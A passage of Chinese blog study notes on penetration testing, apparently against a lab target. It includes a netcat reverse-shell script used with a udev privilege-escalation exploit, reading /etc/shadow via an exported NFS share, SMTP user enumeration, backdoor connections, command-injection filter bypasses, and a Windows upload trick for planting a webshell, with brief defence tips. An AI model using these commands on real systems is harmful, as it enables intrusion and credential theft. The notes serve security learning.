+<p>nc -lvp port 设置监听端口</p>
+<p>echo ‘#!/bin/sh’ &gt; /tmp/run</p>
+<p>echo ‘/bin/netcat -e /bin/sh ipAdress port’ &gt;&gt; /tmp/run</p>
+<p>ps -edf | grep udev</p>
+<p>./exploit (名字) 具有root权限的pid-1  执行</p>
+<h2 id="smtp"><a class="markdownIt-Anchor" href="#smtp"></a> smtp</h2>
+<p>telnet ip 端口</p>
+<p>vrfy 用户名 存在则返回252 不存在则返回550</p>
+<p>metasploit 有smtp_enum用户名枚举模块 smtp_version SMTP版本</p>
+<p>smtp-user-enum 是专门用来进行smtp用户名枚举的工具</p>
+<p>smtp-user-enum -M VRFY -U  字典 -t rhost</p>
+<p>ismtp -h ip:25 -e 邮箱字典</p>
+<h2 id="nfs"><a class="markdownIt-Anchor" href="#nfs"></a> NFS</h2>
+<p>rpcbind 运行在111端口nfs在2049端口</p>
+<p>需要在nfs配置开启rpcbind_enable = “YES”</p>
+<p>nmap -p 111 --script=rpcinfo ip</p>
+<p>探测rpcinfo信息</p>
+<p>metasploit : use auxiliary/scanner/misc/sunrpc_portmapper</p>
+<p>扫描rpc信息</p>
+<p>nmap --script=nfs-* ipAdress 探测目标</p>
+<p>使用showmount 命令确定/共享 需要先安装 apt-get install nfs-common</p>
+<p>showmount -e ip</p>
+<p>查看导出内容</p>
+<p>mkdir nfs_root</p>
+<p>mount -t nfs ip：/~/nfs_root -o nolock</p>
+<p>cat ~/nfs_root/etc/shadow</p>
+<h2 id="smb"><a class="markdownIt-Anchor" href="#smb"></a> SMB</h2>
+<p>samba是linux和unix系统上实现SMB协议的一个免费软件，SMB是一种在局域网上共享文件和打印机的一种通信协议，为局域网中不同计算机之间提供为文件及打印机等资源的共享服务。</p>
+<p>一般运行在139、445端口</p>
+<p>metasploit 使用samba漏洞利用</p>
+<h2 id="rlogin"><a class="markdownIt-Anchor" href="#rlogin"></a> rlogin</h2>
+<p>rlogin是一个unix命令，它允许授权用户进入网络中的其他unix机器并且就像用户在现场操作一样，一旦进入主机，用户可以操作主机允许的任何事情</p>
+<p>512端口 exec服务513端口 login 字段就是表示rlogin开启的标识</p>
+<p>rlogin -l root ip 登陆目标机器</p>
+<p>防御修复</p>
+<p>1、添加root验证登录密码</p>
+<p>2、关闭rlogin服务、改用ssh等来管理服务器</p>
+<h2 id="反序列化远程命令执行漏洞"><a class="markdownIt-Anchor" href="#反序列化远程命令执行漏洞"></a> 反序列化远程命令执行漏洞</h2>
+<p>java rmi 远程调用另一个Java虚拟机对象方法</p>
+<p>1099端口  一般为exploit/multi/misc/java_rmi_server 漏洞利用metasploit</p>
+<p>防御修复：</p>
+<p>1、存在反序列化传输时注意是否可以执行系统命令</p>
+<p>2、存在有缺陷的第三方库要及时升级如commons-collections 要及时升级库或替代或修改命令执行权限</p>
+<h2 id="后门连接"><a class="markdownIt-Anchor" href="#后门连接"></a> 后门连接</h2>
+<p>nmap -sV -p 1524 ip 有些情况下，服务器可能存在某些后门，</p>
+<p>可以使用nmap探测</p>
+<p>nc连接后门 nc IP 端口号</p>
+<h2 id="nfs获取目标密码文件"><a class="markdownIt-Anchor" href="#nfs获取目标密码文件"></a> nfs获取目标密码文件</h2>
+<p>nfs一般开启在2049端口</p>
+<p>nmap --script=nfs-* IP</p>
+<p>showmount 命令确定&quot;/&quot;共享文件系统的根是否可以导出</p>
+<p>showmount属于nfs-common的内容，apt-get install nfs-common</p>
+<p>showmount -e IP</p>
+<p>查看导出内容</p>
+<p>mkdir nfs_root</p>
+<p>mount -t nfs ipAdress:/ ~/nfs_root/ -o nolock</p>
+<p>nolock 是指导出不进行任何加密</p>
+<p>cat  ~/nfs_root/etc/shadow 查看密码文件</p>
+<p>防御措施：做好权限控制</p>
+<h2 id="proftpd测试"><a class="markdownIt-Anchor" href="#proftpd测试"></a> proftpd测试</h2>
+<p>nmap -sV  -p 2121 IP 探测服务</p>
+<p>可以在</p>
+<p><a href="http://www.exploit-db.com" target="_blank" rel="noopener">www.exploit-db.com</a>  搜索漏洞</p>
+<p>防御建议：升级；加强监控措施</p>
+<h2 id="mysql弱口令破解"><a class="markdownIt-Anchor" href="#mysql弱口令破解"></a> mysql弱口令破解</h2>
+<p>nmap -sV -p3306 IP</p>
+<p>mysql 默认在3306端口</p>
+<h2 id="postgresql数据库利用"><a class="markdownIt-Anchor" href="#postgresql数据库利用"></a> postgresql数据库利用</h2>
+<p>nmap -sV  -p 5432 IP</p>
+<p>msf ：搜索模块postgres</p>
+<p>pgAdmin 是相应数据库管理软件</p>
+<p>防御方案：屏蔽任意IP连接postgresql</p>
+<p>修复：升级版本；安全配置</p>
+<h2 id="vnc密码破解"><a class="markdownIt-Anchor" href="#vnc密码破解"></a> vnc密码破解</h2>
+<p>nmap -sV -p5900 IP</p>
+<p>vnc viewer 可以用来连接vnc客户端，查看界面</p>
+<p>防御措施：密码设复杂点；登录失败的限制；ip限制</p>
+<h2 id="irc后门利用"><a class="markdownIt-Anchor" href="#irc后门利用"></a> IRC后门利用</h2>
+<p>IRC（Internet Relay Chat）</p>
+<p>nmap -sV -p6667 IP</p>
+<p>searchsploit UnrealIRCd搜索当前IRC是否存在漏洞</p>
+<p>修复防御方案：升级软件；不用</p>
+<h2 id="tomcat密码破解"><a class="markdownIt-Anchor" href="#tomcat密码破解"></a> tomcat密码破解</h2>
+<p>nmap -sV -p 8180 IP</p>
+<h2 id="杂项笔记"><a class="markdownIt-Anchor" href="#杂项笔记"></a> 杂项笔记</h2>
+<p>布尔型注入没有回显则使用‘注入看回显<br />
+编码格式型注入<br />
+大小写<br />
+waf：判断是不是数字也是可以绕过的<br />
+绕过空格:使用$IFS<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>9</mn><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">9,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">9</span><span class="mpunct">,</span></span></span></span>{IFS}, 重定向符<br />
+绕过黑名单:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">●字符串拼接，a&#x3D;g;cat fla$a<br>●编码绕过iecho &quot;Y2F0IGZsYWc&#x3D; &quot;|base64 -d^<br>●单引号，双引号c&quot;&quot;at flag<br>●反斜线, c\at fl\ag<br>●使用通配符&#x2F;???&#x2F;??t fl??<br></code></pre></td></tr></table></figure>
+<p>Windows文件_上传特性举例</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">利用步骤:<br>1.先上传shell.php:.jpg,得到空的shell.php<br>2.再上传shell.&lt;&lt;&lt;,会覆盖原有的shell.php<br>3.即可得到webshell<br></code></pre></td></tr></table></figure>
+<p>序列化字符逃逸</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">代码中将序列化后的数据中的x替换为yy，正常的序列化数据为<br>a:2:&#123;i:0;s:6:&quot; peri0d&quot;;i:1;s:5:&quot; aaaaa&quot;;&#125;<br>如果我们可以控制用户名去修改密码，那么应该这么构造<br>a:2:&#123;i:0;s:6:&quot;peri0d&quot;;i:1;s:6:&quot;123456&quot;;&#125;&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125;<br>也就是说我们需要“;:1;s:6:&quot;123456“;&#125; 这么多个长度的字符空间<br>filter函数将x变为yy， 我们填充20个x即可满足<br></code></pre></td></tr></table></figure>
+<p>审计高危函数</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">●命令执行函数exec(）、passthru()、 system()、 shell exec()、 popen() 等;<br>●代码执行函数: eval)、 assert(、 preg. repace()、 uasort() 等;<br>●文件包含函数include(、require()等,<br></code></pre></td></tr></table></figure>
+</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">z3lce</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://www.infore.top/2020/07/20/web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">http://www.infore.top/2020/07/20/web学习笔记/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://www.infore.top" target="_blank">z3lce学习记录</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/basic/">basic</a></div><div class="post_share"><div class="social-share" data-image="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/20200719093802.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/07/27/%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"><img class="prev-cover" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/20200719093603.png" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">逆向基础知识</div></div></a></div><div class="next-post pull-right"><a href="/2020/07/15/pwn/"><img class="next-cover" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/20200719092909.png" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">pwn</div></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/2020/09/11/SMC介绍/" title="SMC介绍"><img class="relatedPosts_cover" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/20200719093454.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fas fa-history fa-fw"></i> 2020-09-11</div><div class="relatedPosts_title">SMC介绍</div></div></a></div><div class="relatedPosts_item"><a href="/2020/07/15/pwn/" title="pwn"><img class="relatedPosts_cover" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/20200719092909.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fas fa-history fa-fw"></i> 2020-07-15</div><div class="relatedPosts_title">pwn</div></div></a></div><div class="relatedPosts_item"><a href="/2020/07/27/逆向基础知识/" title="逆向基础知识"><img class="relatedPosts_cover" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/20200719093603.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fas fa-history fa-fw"></i> 2020-07-27</div><div class="relatedPosts_title">逆向基础知识</div></div></a></div><div class="relatedPosts_item"><a href="/2020/07/27/计算机基础/" title="计算机基础"><img class="relatedPosts_cover" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/20200719093150.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fas fa-history fa-fw"></i> 2020-07-27</div><div class="relatedPosts_title">计算机基础</div></div></a></div></div></div></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By z3lce</div><div class="framework-info"><span>驱动 </span><a href="https://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><button id="readmode" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font_plus" title="放大字体"><i class="fas fa-plus"></i></button><button id="font_minus" title="缩小字体"><i class="fas fa-minus"></i></button><button class="translate_chn_to_cht" id="translateLink" title="简繁转换">繁</button><button id="darkmode" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></section><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a>
+ <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div class="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="/js/third-party/fireworks.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script defer id="ribbon" src="/js/third-party/canvas-ribbon.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="true"></script><script id="ribbon_piao" mobile="true" src="/js/third-party/piao.js"></script><script src="/js/third-party/activate-power-mode.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module" defer></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js" async></script><script src="/js/search/local-search.js"></script><script>var endLoading = function () {
+  document.body.style.overflow = 'auto';
+  document.getElementById('loading-box').classList.add("loaded")
+}
+window.addEventListener('load',endLoading)</script></body></html>
